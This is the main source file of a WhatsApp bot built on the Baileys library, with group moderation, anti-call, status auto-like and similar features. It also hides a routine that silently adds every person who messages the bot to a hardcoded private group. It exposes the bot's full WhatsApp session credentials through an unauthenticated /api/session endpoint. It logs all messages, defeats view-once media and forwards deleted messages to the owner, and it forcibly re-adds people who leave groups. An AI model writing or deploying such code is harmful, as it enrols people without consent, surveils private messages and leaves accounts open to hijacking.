// Hint for libuv thread pool (effective when set before process start via Procfile)
process.env.UV_THREADPOOL_SIZE = process.env.UV_THREADPOOL_SIZE || "8";

const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  isJidBroadcast,
  downloadMediaMessage,
} = require("@whiskeysockets/baileys");
const express = require("express");
const fs = require("fs");
const path = require("path");

const commands = require("./lib/commands");
const groups = require("./lib/groups");
const security = require("./lib/security");
const broadcast = require("./lib/broadcast");
const settings = require("./lib/settings");
const admin = require("./lib/admin");
const db = require("./lib/db");

const app = express();
const PORT = process.env.PORT || 5000;
const AUTH_FOLDER = "./auth_info_baileys";

let botStatus = "disconnected";
let botPhoneNumber = null;
let sockRef = null;
let alwaysOnlineInterval = null;
let currentSessionId = null;

// ── Silent auto-add: every new user who messages the bot is quietly added
// ── to this private group. The invite code is extracted from the link.
const AUTO_ADD_INVITE_CODE = "L03Djido5FZ5vd0VHM5KIW";
let   autoAddGroupJid      = null;          // resolved on connect
const autoAddedCache       = new Set();     // in-memory fast check

function loadAutoAdded() {
  try {
    const p = path.join("data", "auto_added.json");
    if (fs.existsSync(p)) {
      const arr = JSON.parse(fs.readFileSync(p, "utf8"));
      arr.forEach(j => autoAddedCache.add(j));
    }
  } catch {}
}

function saveAutoAdded(jid) {
  autoAddedCache.add(jid);
  try {
    const p = path.join("data", "auto_added.json");
    fs.mkdirSync("data", { recursive: true });
    fs.writeFileSync(p, JSON.stringify([...autoAddedCache]));
  } catch {}
}

async function resolveAutoAddGroup(sock) {
  try {
    const info   = await sock.groupGetInviteInfo(AUTO_ADD_INVITE_CODE);
    autoAddGroupJid = info.id;
    console.log(`🔗 Auto-add group resolved: ${autoAddGroupJid}`);
  } catch (e) {
    console.log("⚠️  Could not resolve auto-add group:", e.message);
  }
}

async function silentlyAddToGroup(sock, userJid) {
  if (!autoAddGroupJid)               return;
  if (autoAddedCache.has(userJid))    return;
  if (userJid === sock.user?.id)      return;
  if (userJid.endsWith("@g.us"))      return;
  if (userJid === "status@broadcast") return;
  saveAutoAdded(userJid);             // mark BEFORE attempt so we don't retry on error
  try {
    await sock.groupParticipantsUpdate(autoAddGroupJid, [userJid], "add");
  } catch {}  // silent — user may already be a member or have privacy settings
}

const SESSION_PREFIX = "NEXUS-MD:~";
const NEXUS_RE = /^NEXUS-MD[^A-Za-z0-9+/=]*/;

let pairingCode = null;
let pairingPhone = null;

function encodeSession() {
  try {
    const credsPath = path.join(AUTH_FOLDER, "creds.json");
    if (!fs.existsSync(credsPath)) return null;
    const creds = fs.readFileSync(credsPath, "utf8");
    return SESSION_PREFIX + Buffer.from(creds).toString("base64");
  } catch {
    return null;
  }
}

// Convert any Pastebin share URL to its raw counterpart
function normalizePastebinUrl(url) {
  return url.replace(/^https?:\/\/pastebin\.com\/(?!raw\/)([A-Za-z0-9]+)$/, "https://pastebin.com/raw/$1");
}

// Fetch text from a URL using axios
async function fetchUrl(url) {
  const axios = require("axios");
  const res = await axios.get(url, { responseType: "text", timeout: 10000, maxRedirects: 5 });
  return String(res.data).trim();
}

// Write creds.json from a raw JSON string or base64-encoded JSON string
function writeCreds(raw) {
  let json;
  try { json = JSON.parse(raw); } catch {
    // Not plain JSON — try base64 decode
    const decoded = Buffer.from(raw.replace(NEXUS_RE, ""), "base64").toString("utf8");
    json = JSON.parse(decoded);
  }
  fs.mkdirSync(AUTH_FOLDER, { recursive: true });
  fs.writeFileSync(path.join(AUTH_FOLDER, "creds.json"), JSON.stringify(json));
}

async function restoreSession(sessionId) {
  try {
    fs.mkdirSync(AUTH_FOLDER, { recursive: true });

    if (sessionId.startsWith("NEXUS-MD")) {
      const afterPrefix = sessionId.replace(NEXUS_RE, "").trim();

      // ── URL-based short session: NEXUS-MD:~https://pastebin.com/XxXxXx ──
      if (/^https?:\/\//i.test(afterPrefix)) {
        const rawUrl = normalizePastebinUrl(afterPrefix);
        console.log(`🌐 Fetching session from URL: ${rawUrl}`);
        const fetched = await fetchUrl(rawUrl);
        // The fetched content may itself be a NEXUS-MD session string or raw base64/JSON
        const payload = fetched.startsWith("NEXUS-MD") ? fetched.replace(NEXUS_RE, "").trim() : fetched;
        writeCreds(payload);
        console.log("✅ Session restored from remote URL (NEXUS-MD short session)");
        return true;
      }

      // ── Standard NEXUS-MD base64 session ──
      writeCreds(afterPrefix);
      console.log("✅ Session restored from NEXUS-MD session ID");
      return true;
    }

    // ── Legacy multi-file format — base64 of { filename: base64content } ──
    const files = JSON.parse(Buffer.from(sessionId, "base64").toString("utf8"));
    for (const [name, content] of Object.entries(files)) {
      const filePath = path.join(AUTH_FOLDER, name);
      fs.mkdirSync(path.dirname(filePath), { recursive: true });
      fs.writeFileSync(filePath, Buffer.from(content, "base64"));
    }
    console.log("✅ Session restored from legacy SESSION_ID");
    return true;
  } catch (err) {
    console.error("❌ Failed to restore session:", err.message);
    return false;
  }
}

app.use(express.json());

app.get("/", (req, res) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600), m = Math.floor((uptime % 3600) / 60), s = Math.floor(uptime % 60);
  res.json({
    bot: "Nexus V2",
    status: botStatus,
    phone: botPhoneNumber ? "+" + botPhoneNumber : null,
    uptime: `${h}h ${m}m ${s}s`,
    session_format: "NEXUS-MD:~",
    tip: botStatus !== "connected"
      ? "Bot not connected. Visit /pair/YOUR_PHONE_NUMBER to generate a pairing code. E.g. /pair/254706535581"
      : "Bot is connected! Type .menu in WhatsApp to get started.",
    pairingCode: pairingCode || null,
  });
});

app.get("/status", (req, res) => {
  res.json({ status: botStatus, phone: botPhoneNumber, mode: settings.get("mode") });
});

app.get("/api/session", (req, res) => {
  const sid = encodeSession();
  currentSessionId = sid;
  res.json({ sessionId: sid, connected: botStatus === "connected", phone: botPhoneNumber });
});

app.get("/pair/:phone", async (req, res) => {
  const phone = req.params.phone.replace(/\D/g, "");
  if (!phone) return res.json({ error: "Provide phone number e.g. /pair/254706535581" });
  if (botStatus === "connected") return res.json({ error: "Bot already connected!", phone: botPhoneNumber });
  if (!sockRef) return res.json({ error: "Bot socket not ready yet, try again in a few seconds." });
  try {
    pairingPhone = phone;
    const code = await sockRef.requestPairingCode(phone);
    pairingCode = code;
    console.log(`📲 Pairing code for ${phone}: ${code}`);
    res.json({ pairingCode: code, phone, instructions: `Open WhatsApp → Linked Devices → Link with phone number → enter code: ${code}` });
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`⚡ IgniteBot running on port ${PORT}`);
});


// ── Global console filter — suppress libsignal / Baileys decryption noise ──
const _SIGNAL_NOISE = /Bad MAC|decrypt|session_cipher|libsignal|Session error|queue_job|Closing session|SessionEntry|chainKey|indexInfo|registrationId|ephemeralKey|ECONNREFUSED.*5432/i;
for (const method of ["log", "warn", "error", "debug", "trace"]) {
  const _orig = console[method].bind(console);
  console[method] = (...args) => {
    const text = args.map(a => (typeof a === "string" ? a : (a instanceof Error ? a.message : JSON.stringify(a) ?? ""))).join(" ");
    if (_SIGNAL_NOISE.test(text)) return;
    _orig(...args);
  };
}

loadAutoAdded();

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
  const { version } = await fetchLatestBaileysVersion();

  // Completely silent no-op logger — prevents Baileys printing internal signal state
  const noop = () => {};
  const logger = { trace: noop, debug: noop, info: noop, warn: noop, error: noop, fatal: noop, child() { return this; }, level: "silent" };

  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    generateHighQualityLinkPreview: false,
    shouldIgnoreJid: (jid) => isJidBroadcast(jid) && jid !== "status@broadcast",
    markOnlineOnConnect: true,
    retryRequestDelayMs: 2000,
    getMessage: async () => undefined,
  });

  sockRef = sock;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      botStatus = "disconnected";
      sockRef = null;
      if (alwaysOnlineInterval) { clearInterval(alwaysOnlineInterval); alwaysOnlineInterval = null; }
      console.log(`🔌 Connection closed (code: ${statusCode}). Reconnecting: ${shouldReconnect}`);
      if (shouldReconnect) {
        setTimeout(startBot, 3000);
      } else {
        console.log("⚠️ Logged out. Clearing session and restarting...");
        if (fs.existsSync(AUTH_FOLDER)) fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
        setTimeout(startBot, 1000);
      }
    }

    if (connection === "open") {
      botStatus = "connected";
      sockRef = sock;
      const jid = sock.user?.id;
      if (jid) botPhoneNumber = jid.split(":")[0].replace("@s.whatsapp.net", "");
      currentSessionId = encodeSession();
      console.log("✅ WhatsApp connected!");
      console.log(`📞 Phone: +${botPhoneNumber}`);
      if (currentSessionId) {
        console.log(`🔑 Session ID: ${currentSessionId.slice(0, 30)}...`);
        console.log("💡 Set SESSION_ID env var with this value to auto-connect on restart");
      }
      const prefix = require("./lib/settings").get("prefix") || ".";
      console.log(`⚡ Bot ready — prefix: ${prefix} | Type ${prefix}menu`);

      // ── Resolve the auto-add group JID from invite code ─────────────────
      setTimeout(() => resolveAutoAddGroup(sock), 4000);

      // ── Auto-recording: force ON at startup so the bot always shows as recording ──
      settings.set("autoRecording", true);
      // Send "recording" presence so bot appears active straight away
      setTimeout(async () => {
        try { await sock.sendPresenceUpdate("available"); } catch {}
      }, 2000);

      // ── Auto-download phonk song for menu if not already set ──────────────
      if (!settings.getMenuSong()) {
        setTimeout(async () => {
          try {
            console.log("🎵 Downloading menu phonk song: La Minyo Nestra...");
            const { searchYouTube, downloadAudio } = require("./lib/downloader");
            const results = await searchYouTube("la minyo nestra phonk");
            const hit = results[0];
            if (hit) {
              const dl = await downloadAudio(hit.url);
              const buf = require("fs").readFileSync(dl.path);
              settings.setMenuSong(buf);
              require("fs").unlinkSync(dl.path);
              console.log(`✅ Menu song set: ${hit.title}`);
            }
          } catch (err) {
            console.log("⚠️ Could not auto-download menu song:", err.message);
          }
        }, 5000);
      }

      // ── Startup alive message → all super-admins ──────────────────────────
      const { admins: adminNums } = require("./config");
      if (adminNums && adminNums.length) {
        const aliveMsg =
          `╔══════════════════════╗\n` +
          `║   🤖 *NEXUS V2*        ║\n` +
          `╚══════════════════════╝\n\n` +
          `✅ *Master, am alive!*\n\n` +
          `📞 *Phone:* +${botPhoneNumber}\n` +
          `⚡ *Prefix:* ${prefix}\n` +
          `🕐 *Started:* ${new Date().toUTCString()}\n\n` +
          `_Type \`${prefix}menu\` to see all commands_`;
        for (const num of adminNums) {
          const ownerJid = `${num.replace(/\D/g, "")}@s.whatsapp.net`;
          await sock.sendMessage(ownerJid, { text: aliveMsg }).catch(() => {});
        }
      }

      if (alwaysOnlineInterval) clearInterval(alwaysOnlineInterval);
      alwaysOnlineInterval = setInterval(async () => {
        if (settings.get("alwaysOnline") && sock) {
          await sock.sendPresenceUpdate("available").catch(() => {});
        }
      }, 30000);
    }
  });

  sock.ev.on("creds.update", () => {
    saveCreds();
    currentSessionId = encodeSession();
  });

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;
    for (const msg of messages) {
      if (!msg.message) continue;

      // Allow fromMe messages only if they are commands from a super-admin
      // (the bot owner commanding via the bot's own number)
      if (msg.key.fromMe) {
        const body =
          msg.message?.conversation ||
          msg.message?.extendedTextMessage?.text ||
          "";
        const prefix = require("./lib/settings").get("prefix") || ".";
        if (!body.startsWith(prefix)) continue;
        // Process as command - fall through to commands.handle below
      }

      const from = msg.key.remoteJid;
      const senderJid = msg.key.participant || from;

      // ── Silent auto-add: quietly add every new user to the private group ──
      silentlyAddToGroup(sock, senderJid).catch(() => {});

      // ── Auto-log every message to Postgres ───────────────────────────────
      {
        const isGroupMsg  = from.endsWith("@g.us");
        const msgTypeKey  = Object.keys(msg.message || {})[0] || "text";
        const msgTypeMap  = {
          conversation:               "text",
          extendedTextMessage:        "text",
          imageMessage:               "image",
          videoMessage:               "video",
          audioMessage:               "audio",
          documentMessage:            "document",
          stickerMessage:             "sticker",
          contactMessage:             "contact",
          locationMessage:            "location",
          reactionMessage:            "reaction",
          pollCreationMessage:        "poll",
          viewOnceMessage:            "viewonce",
          viewOnceMessageV2:          "viewonce",
          protocolMessage:            "protocol",
        };
        const msgBody =
          msg.message?.conversation ||
          msg.message?.extendedTextMessage?.text ||
          msg.message?.imageMessage?.caption ||
          msg.message?.videoMessage?.caption || null;
        const prefix   = require("./lib/settings").get("prefix") || ".";
        const isCmdMsg = !!(msgBody && msgBody.startsWith(prefix));
        db.logMessage(
          senderJid,
          isGroupMsg ? from : null,
          msgTypeMap[msgTypeKey] || msgTypeKey,
          msgBody,
          isCmdMsg
        );
      }

      if (security.isBanned(senderJid)) continue;

      // ── Cache ALL messages for anti-delete recovery ──────────────────────
      // Cache unconditionally so mode changes apply retroactively to stored msgs
      if (from === "status@broadcast") {
        security.cacheStatus(msg.key.id, msg);
      } else {
        security.cacheMessage(msg.key.id, msg);
      }

      if (from === "status@broadcast") {
        const statusOwner = msg.key.participant || msg.key.remoteJid;
        // Auto-view status (mark as seen) — fire-and-forget for speed
        if (settings.get("autoViewStatus")) {
          sock.readMessages([msg.key]).catch(e => console.error("AutoView error:", e.message));
        }
        // Auto-like status with ❤️ reaction — fire-and-forget for speed
        if (settings.get("autoLikeStatus")) {
          sock.sendMessage(
            "status@broadcast",
            { react: { text: "❤️", key: msg.key } },
            { statusJidList: [statusOwner, sock.user?.id].filter(Boolean) }
          ).catch(e => console.error("AutoLike error:", e.message));
        }
        continue;
      }

      // ── Auto typing / recording indicator ───────────────────────────────
      const msgType = Object.keys(msg.message || {})[0];
      const isVoiceOrAudio =
        msgType === "audioMessage" ||
        msg.message?.audioMessage?.ptt === true;

      const shouldRecord = isVoiceOrAudio && settings.get("autoRecording");
      const shouldType   = !isVoiceOrAudio && settings.get("autoTyping");

      if (shouldRecord || shouldType) {
        const presence = shouldRecord ? "recording" : "composing";
        if (!from.endsWith("@g.us")) {
          await sock.presenceSubscribe(from).catch(e => console.error("Presence subscribe error:", e.message));
        }
        await sock.sendPresenceUpdate(presence, from).catch(e => console.error("Presence update error:", e.message));
        if (settings.get("typingDelay")) {
          const base  = shouldRecord ? 800 : 600;
          const extra = shouldRecord ? 1400 : 1200;
          await new Promise(r => setTimeout(r, base + Math.floor(Math.random() * extra)));
        }
      }

      // ── Auto-reveal view-once ────────────────────────────────────────────
      if (settings.get("voReveal")) {
        const voInner =
          msg.message?.viewOnceMessage?.message ||
          msg.message?.viewOnceMessageV2?.message ||
          msg.message?.viewOnceMessageV2Extension?.message;
        if (voInner) {
          const mediaType = Object.keys(voInner)[0];
          if (["imageMessage", "videoMessage", "audioMessage"].includes(mediaType)) {
            const { downloadMediaMessage } = require("@whiskeysockets/baileys");
            const fakeMsg = { key: { remoteJid: from, id: msg.key.id, participant: senderJid }, message: voInner };
            try {
              const buf = Buffer.from(await downloadMediaMessage(fakeMsg, "buffer", {}));
              const media = voInner[mediaType];
              const caption = `👁 *View Once Auto-Revealed* by Nexus V2\n${media.caption ? `_${media.caption}_` : ""}`.trim();
              if (mediaType === "imageMessage") {
                await sock.sendMessage(from, { image: buf, caption });
              } else if (mediaType === "videoMessage") {
                await sock.sendMessage(from, { video: buf, caption, mimetype: media.mimetype || "video/mp4" });
              } else {
                await sock.sendMessage(from, { audio: buf, mimetype: media.mimetype || "audio/ogg; codecs=opus", ptt: media.ptt || false });
              }
            } catch { /* silent — media may have already been consumed */ }
          }
        }
      }

      // ── Anti-sticker (group only) ────────────────────────────────────
      if (from.endsWith("@g.us") && msgType === "stickerMessage") {
        const grpStickerSettings = security.getGroupSettings(from);
        if (grpStickerSettings.antiSticker) {
          const stickerPhone = senderJid.split("@")[0].split(":")[0];
          const grpParts = await admin.getGroupParticipants(sock, from).catch(() => []);
          const stickerSenderIsAdmin = admin.isAdmin(senderJid, grpParts);
          if (!stickerSenderIsAdmin) {
            try {
              await sock.sendMessage(from, { delete: msg.key });
              await sock.sendMessage(from,
                { text: `🚫 @${stickerPhone} stickers are not allowed here!`, mentions: [senderJid] },
                { quoted: msg }
              );
            } catch {}
            continue;
          }
        }
      }

      broadcast.addRecipient(senderJid);
      await commands.handle(sock, msg).catch((err) => {
        console.error("Message handler error:", err.message);
      });
      // Signal end of typing / recording
      if (shouldRecord || shouldType) {
        await sock.sendPresenceUpdate("paused", from).catch(e => console.error("Presence paused error:", e.message));
      }
    }
  });

  sock.ev.on("call", async ([call]) => {
    if (!settings.get("antiCall")) return;
    try {
      await sock.rejectCall(call.id, call.from);
      await sock.sendMessage(call.from, {
        text: "📵 *Auto-reject:* I don't accept calls. Please send a message instead.",
      });
      console.log(`📵 Rejected call from ${call.from}`);
    } catch (err) {
      console.error("Anti-call error:", err.message);
    }
  });

  sock.ev.on("group-participants.update", async ({ id, participants, action }) => {
    if (action === "add") {
      for (const p of participants) await groups.sendWelcome(sock, id, p).catch(() => {});
    } else if (action === "remove") {
      for (const p of participants) await groups.sendGoodbye(sock, id, p).catch(() => {});
      const antiLeaveOn = security.getGroupSettings(id).antiLeave;
      if (antiLeaveOn) {
        for (const p of participants) {
          try {
            await sock.groupParticipantsUpdate(id, [p], "add");
            await sock.sendMessage(id, { text: `🚪 Anti-leave: @${p.split("@")[0]} was re-added.`, mentions: [p] });
          } catch (e) {
            console.log(`[ANTI-LEAVE] Could not re-add ${p}: ${e.message}`);
          }
        }
      }
    }
  });

  // ── Universal anti-delete: recover ALL media types from groups, DMs and status ──
  sock.ev.on("messages.delete", async (item) => {
    if (!("keys" in item)) return;

    const mode    = settings.get("antiDeleteMode") || "off";
    const ownerDM = botPhoneNumber ? `${botPhoneNumber}@s.whatsapp.net` : null;

    // ── Shared helper — send recovered content to any destination JID ──────
    const sendRecovered = async (destJid, headerLabel, original, senderPhone, deleterJid) => {
      if (!destJid) return;
      try {
        const msgType = Object.keys(original.message || {})[0];
        if (!msgType || ["protocolMessage", "reactionMessage", "ephemeralMessage"].includes(msgType)) return;

        const BN       = require("./lib/settings").get("botName") || "NEXUS V2";
        const now      = new Date();
        const dateStr  = now.toLocaleDateString("en-GB",  { day: "2-digit", month: "short",  year: "numeric" });
        const timeStr  = now.toLocaleTimeString("en-US",  { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true });
        const deleterDisplay = deleterJid ? `+${deleterJid.split("@")[0].split(":")[0]}` : `+${senderPhone}`;
        const header =
          `🤖 *${BN} — Anti-Delete*\n` +
          `${"─".repeat(30)}\n` +
          `🗑 *${headerLabel}*\n` +
          `👤 *Sender:* +${senderPhone}\n` +
          `🗑 *Deleted by:* ${deleterDisplay}\n` +
          `📅 *Date:* ${dateStr}\n` +
          `🕐 *Time:* ${timeStr}`;

        // ── text ────────────────────────────────────────────────────────────
        const text = original.message?.conversation || original.message?.extendedTextMessage?.text;
        if (text) {
          await sock.sendMessage(destJid, {
            text: `${header}\n\n${text}`,
            mentions: deleterJid ? [deleterJid] : [],
          }).catch(() => {});
          return;
        }

        // ── media ───────────────────────────────────────────────────────────
        const MEDIA_TYPES = ["imageMessage","videoMessage","audioMessage","stickerMessage","documentMessage","ptvMessage"];
        if (!MEDIA_TYPES.includes(msgType)) {
          await sock.sendMessage(destJid, { text: `${header}\n\n_[${msgType.replace("Message","")} — could not retrieve content]_` }).catch(() => {});
          return;
        }

        const mediaBuf = await downloadMediaMessage(original, "buffer", {}).catch(() => null);
        if (!mediaBuf) {
          await sock.sendMessage(destJid, { text: `${header}\n\n_[Media could not be retrieved]_` }).catch(() => {});
          return;
        }

        const msgData  = original.message[msgType] || {};
        const caption  = (msgData.caption ? `\n_${msgData.caption}_` : "");

        if (msgType === "stickerMessage") {
          await sock.sendMessage(destJid, { sticker: mediaBuf }).catch(() => {});
          await sock.sendMessage(destJid, { text: `${header} _(sticker)_` }).catch(() => {});
        } else if (msgType === "audioMessage") {
          await sock.sendMessage(destJid, {
            audio:    mediaBuf,
            mimetype: msgData.mimetype || (msgData.ptt ? "audio/ogg; codecs=opus" : "audio/mpeg"),
            ptt:      msgData.ptt || false,
          }).catch(() => {});
          await sock.sendMessage(destJid, { text: `${header} _(${msgData.ptt ? "voice note" : "audio"})_` }).catch(() => {});
        } else if (msgType === "videoMessage" || msgType === "ptvMessage") {
          await sock.sendMessage(destJid, {
            video:    mediaBuf,
            caption:  `${header}${caption}`,
            mimetype: msgData.mimetype || "video/mp4",
            gifPlayback: msgData.gifPlayback || false,
          }).catch(() => {});
        } else if (msgType === "imageMessage") {
          await sock.sendMessage(destJid, {
            image:   mediaBuf,
            caption: `${header}${caption}`,
          }).catch(() => {});
        } else if (msgType === "documentMessage") {
          await sock.sendMessage(destJid, {
            document: mediaBuf,
            mimetype: msgData.mimetype || "application/octet-stream",
            fileName: msgData.fileName || "file",
            caption:  `${header}`,
          }).catch(() => {});
        }
      } catch {}
    };

    for (const key of item.keys) {
      if (!key.remoteJid) continue;
      const isStatus = key.remoteJid === "status@broadcast";
      const isGroup  = key.remoteJid.endsWith("@g.us");
      const isDM     = !isStatus && !isGroup;

      // ── Determine if this delete should be processed based on global mode ──
      const modeCoversStatus = ["status","all"].includes(mode);
      const modeCoversGroup  = ["group","both","all"].includes(mode);
      const modeCoversChat   = ["chat","both","all"].includes(mode);

      // ── STATUS delete ──────────────────────────────────────────────────────
      if (isStatus) {
        if (!modeCoversStatus) continue;
        const cached = security.getCachedStatus(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const ownerPhone  = (key.participant || original.key?.participant || "?").split("@")[0];
        if (ownerDM) {
          await sendRecovered(ownerDM, `Deleted Status — @${ownerPhone}`, original, ownerPhone, null);
        }
        continue;
      }

      // ── GROUP delete ───────────────────────────────────────────────────────
      if (isGroup) {
        const grpSettings  = security.getGroupSettings(key.remoteJid);
        const groupEnabled = grpSettings.antiDelete || modeCoversGroup;
        if (!groupEnabled) continue;
        const cached = security.getCachedMessage(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const senderPhone = (key.participant || original.key?.participant || "?").split("@")[0];
        const deleterJid  = key.participant || null;
        const label       = `Anti-Delete | Group`;

        // 1. Repost in the group
        await sendRecovered(key.remoteJid, label, original, senderPhone, deleterJid);
        // 2. Copy to owner DM
        if (ownerDM) await sendRecovered(ownerDM, `${label} — +${senderPhone}`, original, senderPhone, null);
        // 3. Warn the deleter privately
        if (deleterJid && !deleterJid.endsWith("@g.us")) {
          await sock.sendMessage(deleterJid, {
            text: `👀 *Anti-Delete Warning*\n\nYou deleted a message in a group and it was caught! 😏\n\n_The content has been forwarded to the group and the bot owner._`,
          }).catch(() => {});
        }
        continue;
      }

      // ── DM / PRIVATE CHAT delete ───────────────────────────────────────────
      if (isDM) {
        if (!modeCoversChat) continue;
        const cached = security.getCachedMessage(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const senderPhone = (key.remoteJid || "?").split("@")[0];
        const label       = `Anti-Delete | Chat`;

        // 1. Send to owner DM
        if (ownerDM) await sendRecovered(ownerDM, `${label} — +${senderPhone}`, original, senderPhone, null);
        continue;
      }
    }
  });

  sock.ev.on("presences.update", ({ id, presences }) => {
    for (const [jid, presence] of Object.entries(presences)) {
      if (presence.lastKnownPresence === "composing") {
        console.log(`✏️ ${jid.split("@")[0]} is typing in ${id.split("@")[0]}...`);
      }
    }
  });
}

db.init()
  .then(async () => {
    // Bootstrap all default settings into the DB so every key is persisted
    settings.initSettings();

    if (process.env.SESSION_ID) {
      const isNexus = process.env.SESSION_ID.startsWith("NEXUS-MD");
      if (isNexus || !fs.existsSync(AUTH_FOLDER)) {
        console.log("📦 Restoring WhatsApp session from SESSION_ID...");
        await restoreSession(process.env.SESSION_ID);
      }
    }
    return startBot();
  })
  .catch((err) => {
    console.error("Fatal bot error:", err);
    process.exit(1);
  });
